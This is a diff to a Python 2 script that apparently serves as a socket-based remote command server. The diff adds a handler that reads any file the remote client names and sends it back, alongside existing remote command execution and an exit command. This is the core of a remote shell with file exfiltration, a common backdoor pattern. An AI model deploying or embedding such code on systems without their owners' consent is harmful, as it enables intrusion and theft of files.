@@ -82,9 +82,19 @@ def run_command(cmd):
         result = e
     return result
 
-def download_file(file):
-    print "download_file"
-    return
+def download_file(dl_filename,conn):
+    try:
+        data = ""
+        fd = open(dl_filename,"rb")
+        data = fd.read()
+        print data
+        fd.close()
+    except Exception as e:
+        data = e.message
+        return False
+    finally:
+        conn.send(data)
+    return True
 
 def upload_file(file):
     print "upload_file"
@@ -114,15 +124,22 @@ def main():
                 break
             send_data = ""
             recv_data = server_recv(conn)
-            if recv_data is None:
+            if recv_data is None or recv_data == "":
                 print "[-] Connection closed!"
                 break
             (cmd,act_type) = cmd_parse(recv_data)
             if act_type == 0:
                 '''do run command action'''
                 send_data = run_command(cmd)
-            if act_type == 1:
+            elif act_type == 1:
                 '''download file action'''
-                download_file(dl_file)
+                if download_file(cmd,conn):
+                    print "[+] download %s successed!" % cmd
+                else:
+                    print "[-] download %s failure!" % cmd
+                send_data = "\r"
+            elif act_type == 0xff:
+                print "[*] exited process.."
+                exit()
             server_send(conn,send_data)
 main()
